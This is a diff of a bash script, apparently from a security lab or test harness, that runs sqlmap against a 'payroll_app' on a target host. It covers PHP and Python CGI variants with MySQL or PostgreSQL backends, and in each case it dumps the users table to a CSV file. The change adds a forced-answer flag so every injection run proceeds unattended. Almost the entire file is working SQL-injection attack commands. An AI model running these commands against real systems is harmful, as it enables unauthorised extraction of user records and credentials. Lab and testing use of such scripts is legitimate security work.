@@ -4,7 +4,7 @@ SERVER=$3
 
 if [[ ($DATABASE == "mysql") && ($SERVER == "php") ]]
 then 
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=MySQL --dump 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=MySQL --answers="force=Y" --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
 	FILE=~/users.csv
 	if test -f "$FILE"
@@ -16,7 +16,7 @@ then
 	rm ~/users.csv
 elif [[ ($DATABASE == "postgresql") && ($SERVER == "php") ]]
 then
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --answers="force=Y" --dump 
 	FILE=~/users.csv
 	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
 	if test -f "$FILE"
@@ -28,7 +28,7 @@ then
 	rm ~/users.csv
 elif [[ ($DATABASE == "mysql") && ($SERVER == "py") ]]
 then
-	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=MySQL --dump 
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=MySQL --answers="force=Y" --dump 
 	FILE=~/users.csv
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
 	if test -f "$FILE"
@@ -40,7 +40,7 @@ then
 	rm ~/users.csv
 elif [[ ($DATABASE == "postgresql") && ($SERVER == "py") ]]
 then
-	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump 
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=postgresql --answers="force=Y" --dump 
 	FILE=~/users.csv
 	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
 	if test -f "$FILE"
